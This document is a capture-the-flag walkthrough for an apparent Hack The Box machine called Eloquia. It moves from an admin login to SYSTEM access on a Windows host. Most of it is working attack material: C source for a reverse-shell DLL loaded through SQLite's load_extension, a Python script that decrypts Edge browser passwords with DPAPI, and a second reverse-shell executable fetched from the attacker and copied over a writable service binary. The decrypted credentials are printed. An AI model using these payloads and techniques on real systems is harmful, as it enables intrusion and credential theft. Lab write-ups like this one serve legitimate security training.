-----------------ELOUIA NOTES FROM ADMIN PANEL----------------------------------------------------------------------------------------------------------------------------------------------



Step 1: ACCESS THE ADMIN PANEL



	CREDS : admin : MyEl0qu!@Admin







********************************************************************************************************************************************************************************************



Step 2: Initial FootHold



while exploring the admin panel we can see some utilities, as SQL Explorer, which execute SQL commands





*********Checking the SQL Version****************



go to eloquia.htb/dev/sql-explorer/new/ endpoint (You'll see the section where you can execute SQL commands)



select sqliteversion(); //check for version



sqliteversion()

3.45.1



it provide a dedicated SQLITE backend supports, but we can't just directly execute any RCE commands.







But while searching more, I've got a misconfiguration, That the SQLITE has a Function Enabled named loadextension();



loadextension() imports the libraries without validation.



So We can trigger this misconfiguration and use our own .dll  reverse shell payload to get the initial foothold





********************************************************************************************************************************************************************************************



Step- 3 Payload Creation





lets first create a Custom C Reverse Shell payload that can be uploaded later



------------------------------------------------------------------------------------------------------------------------

/*

* SQLite Reverse Shell DLL for Eloquia HTB

* Compile: x8664-w64-mingw32-gcc -shared -o revshell.dll revshell.c -lws232

*/

\#include <windows.h>

\#include <winsock2.h>

\#include <stdio.h>

\#include <stdlib.h>



\#pragma comment(lib, "ws232.lib")



\#define LHOST "YOURIP"

\#define LPORT YOURPORT



// Function that will be called when DLL is loaded

declspec(dllexport) void revshell(void) {

   WSADATA wsaData;

   SOCKET sock;

   struct sockaddrin addr;

   STARTUPINFO si;

   PROCESSINFORMATION pi;

   char cmd\[] = "cmd.exe";

   

   // Initialize Winsock

   if (WSAStartup(MAKEWORD(2, 2), \&wsaData) != 0) {

       return;

   }

   

   // Create socket

   sock = WSASocket(AFINET, SOCKSTREAM, IPPROTOTCP, NULL, 0, 0);

   if (sock == INVALIDSOCKET) {

       WSACleanup();

       return;

   }

   

   // Setup address structure

   addr.sinfamily = AFINET;

   addr.sinaddr.saddr = inetaddr(LHOST);

   addr.sinport = htons(LPORT);

   

   // Connect to listener

   if (WSAConnect(sock, (SOCKADDR*)\&addr, sizeof(addr), NULL, NULL, NULL, NULL) == SOCKETERROR) {

       closesocket(sock);

       WSACleanup();

       return;

   }

   

   // Setup process startup info

   ZeroMemory(\&si, sizeof(si));

   si.cb = sizeof(si);

   si.dwFlags = STARTFUSESTDHANDLES;

   si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;

   

   // Create process with redirected I/O

   ZeroMemory(\&pi, sizeof(pi));

   if (!CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, \&si, \&pi)) {

       closesocket(sock);

       WSACleanup();

       return;

   }

   

   // Wait for process to exit

   WaitForSingleObject(pi.hProcess, INFINITE);

   

   // Cleanup

   CloseHandle(pi.hProcess);

   CloseHandle(pi.hThread);

   closesocket(sock);

   WSACleanup();

}



// Alternative: Simple test function that shows MessageBox

declspec(dllexport) void test(void) {

   MessageBox(NULL, "DLL Loaded Successfully!", "Eloquia HTB", MBOK | MBICONINFORMATION);

}



// DLL entry point - called when DLL is loaded

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {

   switch (fdwReason) {

       case DLLPROCESSATTACH:

           // Uncomment ONE of these:

           // test();  // For testing only - shows MessageBox

           revshell(); // For actual reverse shell

           break;

       case DLLPROCESSDETACH:

           break;

       case DLLTHREADATTACH:

           break;

       case DLLTHREADDETACH:

           break;

   }

   return TRUE;

}

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------





The above C program can be used to get the reverse shell, this program includes standard Win32 API calls (WSASocket, CreateProcess) to spawn cmd.exe and tunnel the input/output over a TCP socket.

(note: before compiling please make the necessary changes for IP and port)





Save it and compile it using -  x8664-w64-mingw32-gcc -shared -o revshell.dll revshell.c -lws232





********************************************************************************************************************************************************************************************





Step 4: Upload the Payload 



1-- to Upload this payload go to this eloquia.htb/accounts/admin/Eloquia/article/  (here you'll see the list of articles that are saved )



Choose any article, and you can upload the payload at the place of banner image, which is stored at  static/assets/images/blog/xpl.dll 





2-- Now on Your Terminal Setup a netcat listener.





3-- Make A query using this endpoint eloquia.htb/accounts/admin/explorer/query/1/change/ fill out the necessary fields.



And in the SQL query Section write this--> SELECT loadextension('static/assets/images/blog/xpl.dll');





4-- In the Top Right Corner you'll see a "View on Site" Button, click on it to Trigger the Payload 



it will lead you to an endpoint "eloquia.htb/accounts/admin/r/9/X/"  Where X-> specifies the ID of Query.







5-- Check the Listener, you may have got a shell



nc -lvnp 4444

listening on \[any] 4444 ...

connect to \[10.10.14.**] from (UNKNOWN) \[10.10.11.99] 52123

Microsoft Windows \[Version 10.0.17763.8027]

(c) 2018 Microsoft Corporation. All rights reserved.



C:\Web\Eloquia>whoami

whoami

eloquia\web



C:\Web\Eloquia>



********************************************************************************************************************************************************************************************



Step:-6 Obtain The User Flag





The web User has the User flag, to obtain it just go to C:/Users/Web/Desktop



and then ---> type user.txt (cause windows CMD does not provides cat.)





********************************************************************************************************************************************************************************************





Step:-7 Dumping The Creds



\[*] So While Enumerating the Shell, and i Saw that in the Microsoft Edge Folder Located At C:\Users\web\AppData\Local\Microsoft\Edge\User Data\Default. is actually Contains the Creds



Key files found:



Login Data: An SQLite database containing saved credentials (passwords are encrypted With AES-256-GEM Hash).

Local State: A JSON file containing the encrypted master key used to decrypt the database(Encrypted using DPAPI).



So DPAPI Decryption Theory:-

Chromium-based browsers (Edge, Chrome) encrypt saved passwords using AES-256-GCM. The AES key itself is stored in the Local State file, but it is encrypted using the Windows DPAPI (Data Protection API).



DPAPI encryption is tied to the user’s login session. Since we are executing code as the user (web), we can transparently call the Windows API CryptUnprotectData to decrypt the master key. Once we have the master key, we can decrypt the passwords in Login Data.



--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------



\[*] So for this task Will create one Python Script will be using a Python Script. 



(note:- If you had any trouble finding the python in the box, just go to C:\program files\python311, there you'll get the full python Framework. and it only can be used in that particular directory)

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

Lets make the Script:-



\#!/usr/bin/env python

import os, json, base64, sqlite3, ctypes, tempfile



\# DPAPI Function

class DATABLOB(ctypes.Structure):

   fields = \[("cbData", ctypes.culong), ("pbData", ctypes.cvoidp)]



crypt32 = ctypes.windll.crypt32



def dpapidecrypt(data):

   if not data: return None

   inblob = DATABLOB()

   inblob.cbData = len(data)

   buffer = ctypes.createstringbuffer(data)

   inblob.pbData = ctypes.addressof(buffer)

   outblob = DATABLOB()

   if crypt32.CryptUnprotectData(ctypes.byref(inblob), None, None, None, None, 0, ctypes.byref(outblob)):

       result = ctypes.stringat(outblob.pbData, outblob.cbData)

       ctypes.windll.kernel32.LocalFree(ctypes.cvoidp(outblob.pbData))

       return result

   return None



\# Paths

edgepath = r"C:\Users\web\AppData\Local\Microsoft\Edge\User Data"

localstate = os.path.join(edgepath, "Local State")

logindb = os.path.join(edgepath, "Default", "Login Data")



print("\[*] Edge Password Decryptor")

print(f"\[*] Master Key: c7f1ad7b079947b4bb1dc53b87404406...")



\# Try to read DB directly (no copy)

try:

   conn = sqlite3.connect(logindb)

   cursor = conn.cursor()

   cursor.execute("SELECT originurl, usernamevalue, passwordvalue FROM logins")

   rows = cursor.fetchall()

   conn.close()

   

   print(f"\[+] Found {len(rows)} credentials in database")

   

   # Try to import cryptography

   try:

       from cryptography.hazmat.primitives.ciphers.aead import AESGCM

       

       # Get master key first

       with open(localstate, 'r') as f:

           encryptedkey = json.load(f)\['oscrypt']\['encryptedkey']

       encryptedbytes = base64.b64decode(encryptedkey)

       masterkey = dpapidecrypt(encryptedbytes\[5:])

       

       if masterkey:

           print("\[+] Decrypting passwords...")

           found = 0

           

           for url, username, encryptedpw in rows:

               if username and encryptedpw and encryptedpw\[:3] == b'v10':

                   try:

                       iv = encryptedpw\[3:15]

                       ciphertext = encryptedpw\[15:-16]

                       tag = encryptedpw\[-16:]

                       aesgcm = AESGCM(masterkey)

                       password = aesgcm.decrypt(iv, ciphertext + tag, None).decode('utf-8', errors='ignore')

                       

                       print(f"\n\[+] {url\[:60]}")

                       print(f"    User: {username}")

                       print(f"    Pass: {password\[:30]}")

                       found += 1

                   except:

                       pass

           

           if found > 0:

               print(f"\n\[+] Successfully decrypted {found} passwords!")

           else:

               print("\[!] Could not decrypt any passwords")

       else:

           print("\[!] Could not get master key")

           

   except ImportError:

       print("\[!] Install cryptography: pip install cryptography")

       print("\[*] For now, showing URLs and usernames only:")

       for url, username,  in rows\[:10]:  # Show first 10

           if username:

               print(f"  {url\[:50]} - {username}")

       

except sqlite3.OperationalError as e:

   print(f"\[!] Database locked. Close Edge browser and try again.")

except Exception as e:

   print(f"\[!] Error: {e}")



--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------



\[*] Save the above Script in Your Linux machine, and then send it to target via Curl





\[*] Then Go to the C:\program files\python311 directory, and use the python 



C:\Program Files\Python311>python --version

python --version

Python 3.11.9







\[*] Now that we can See Python is there and can be used to run the script, Now Lets RUN the Script 





C:\Program Files\Python311>python C:\Web\Temp\Decrypt.py

python C:\Web\Temp\Decrypt.py

\[*] Edge Password Decryptor

\[*] Master Key: c7f1ad7b079947b4bb1dc53b87404406...

\[+] Found 4 credentials in database

\[+] Decrypting passwords...



\[+] http://eloquia.htb/accounts/login/

   User: Olivia.KAT

   Pass: S3cureP@sswdIGu3ss



\[+] https://eloquia.htb/

   User: test

   Pass: testtest1234!



\[+] https://chatgpt.com/

   User: olivia.kat

   Pass: S3cureP@sswd3Openai



\[+] Successfully decrypted 3 passwords!







\[*] After Running the Script we Got Some valid Creds:-



	 User: Olivia.KAT

  	 Pass: S3cureP@sswdIGu3ss



********************************************************************************************************************************************************************************************



Step-8:- Privilege Escalation* 



Now that we have valid Creds dumped, lets try getting a Winrm Session for that user





\[*] evil-winrm -i 10.10.11.99 -u 'olivia.kat' -p 'S3cureP@sswdIGu3ss'

                                       

Evil-WinRM shell v3.7

                                       

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quotingdetectionproc' for module Reline                                           

                                       

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                      

                                       

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Olivia.KAT\Documents>





\[*]After getting the evil-winrm, session we can look for the Services, that are running.



\[*]To Check what services are running on the target, we can use the 


	\[#] $services = Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\*" (With the help of Windows registry we can assign all the services in the $services object)



	\[#] After that Just run $services | Select-Object PSChildName, @{n="DisplayName";e={$.DisplayName}}, @{n="ImagePath";e={$.ImagePath}} | Format-Table -AutoSize (To list all the services and Display their path and name)





	\[#]After That You'll Get a Bunch OF services List. So There is a Custom Software Running With the path --> HKLM\SYSTEM\CurrentControlSet\Services\Failure2Ban | Binary Path--> C:\Program Files\Qooqle IPS Software\Failure2Ban

	



	\[#]What is Failure2Ban --> Well i don't know much about it, but it is like a IDS/IPS System, that checks for windows logs for failed login attempts, or brute-Force Attacks and also Bans IP addresses After Too many Failures. 





	\[#]Key Findings--> When we look for the Service registry Entry of Failure2Ban, With Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\Failure2Ban" | Select-Object *


		We get ----  *Evil-WinRM* PS C:\Users\Olivia.KAT\Documents> Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\Failure2Ban" | Select-Object *





Type         : 16

Start        : 2

ErrorControl : 1

ImagePath    : C:\Program Files\Qooqle IPS Software\Failure2Ban - Prototype\Failure2Ban\bin\Debug\Failure2Ban.exe

ObjectName   : LocalSystem

PSPath       : Microsoft.PowerShell.Core\Registry::HKEYLOCALMACHINE\SYSTEM\CurrentControlSet\Services\Failure2Ban

PSParentPath : Microsoft.PowerShell.Core\Registry::HKEYLOCALMACHINE\SYSTEM\CurrentControlSet\Services

PSChildName  : Failure2Ban

PSDrive      : HKLM

PSProvider   : Microsoft.PowerShell.Core\Registry




	Above We can see that this **Failure2Ban Runs with LocalSystem(Administrator) Privileges**.  



 [*] As We Know that it Runs With SYSTEM Privileges, Now lets check, does the current User Olivia.kat Has any read, Write, execute Permissions on that Service or not

	[#]To Do so  Use --> Get-Acl "C:\Program Files\Qooqle IPS Software\Failure2Ban - Prototype\Failure2Ban\bin\Debug\Failure2Ban.exe"

		Directory: C:\Program Files\Qooqle IPS Software\Failure2Ban - Prototype\Failure2Ban\bin\Debug


Path            Owner                  Access
----            -----                  ------
Failure2Ban.exe BUILTIN\Administrators ELOQUIA\Olivia.KAT Allow  Write, ReadAndExecute, Synchronize...

	[#]In The above output We can see That Current User Olivia.kat has Writable Privileges.


	[#]--> Attack Plan:-
			1.Lets Create a exploit.c exploit for A reverse Shell
			2.Then Compile It with mingw32-gcc with outfile as exe 
			3.Send it to target via Invoke-WebRequest
			4.Set up a Netcat Listener 
			5.Repeatadly overwrite the Content of Exploit.exe to Failure2Ban.exe.





 [*]Execution-->
	1. Create Exploit.c

#include <winsock2.h>
#include <windows.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32.lib")


#define CLIENT_IP   "YOUR IP"
#define CLIENT_PORT 4444

int main(void) {
    WSADATA wsaData;
    SOCKET sockt;
    struct sockaddr_in sa;
    STARTUPINFO sinfo;
    PROCESS_INFORMATION pinfo;

    if (WSAStartup(MAKEWORD(2,2), &wsaData) != 0) {
        return 1;
    }

    sockt = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (sockt == INVALID_SOCKET) {
        WSACleanup();
        return 1;
    }

    sa.sin_family = AF_INET;
    sa.sin_port = htons(CLIENT_PORT);
    sa.sin_addr.s_addr = inet_addr(CLIENT_IP);


    while (connect(sockt, (struct sockaddr*)&sa, sizeof(sa)) == SOCKET_ERROR) {
        Sleep(5000);
    }

    memset(&sinfo, 0, sizeof(sinfo));
    sinfo.cb = sizeof(sinfo);
    sinfo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    sinfo.wShowWindow = SW_HIDE;
    sinfo.hStdInput = (HANDLE)sockt;
    sinfo.hStdOutput = (HANDLE)sockt;
    sinfo.hStdError = (HANDLE)sockt;

    char cmd[] = "cmd.exe";

    if (CreateProcessA(NULL, cmd, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo)) {
        WaitForSingleObject(pinfo.hProcess, INFINITE);
        CloseHandle(pinfo.hProcess);
        CloseHandle(pinfo.hThread);
    }

    closesocket(sockt);
    WSACleanup();
    return 0;
}

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

2. Compile-->  x86_64-w64-mingw32-gcc Exploit.c -o Failure.exe -lws2_32 -mwindows -s -Wl,--strip-all


3.  on Target Machine : 

invoke-WebRequest -Uri "Your IP":8000/Failure.exe -OutFile Failure.exe


4.Set up Listener
	nc -lvnp 4444



5.Repeatadly Overwrite The exploit with the Service.

	while ($true) {
    try {
        Copy-Item "./Failure.exe" "./Failure2Ban.exe" -Force -ErrorAction Stop
        Write-Host "[+] Overwrite successful"
        break
    } catch {
    }
} 

And wait for 5-6 Minutes. Until it Iterates

********************************************************************************************************************************************************************************************

Step 9: Access Gained

[*]Check On The Listener -->


nc -lvnp 4444                                    
listening on [any] 4444 ...
connect to [10.10.14.221] from (UNKNOWN) [10.10.11.99] 51700
Microsoft Windows [Version 10.0.17763.8027]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system


********************************************************************************************************************************************************************************************


Step 10: Go Get the Root flag At C:\Users\Administrator\root.txt














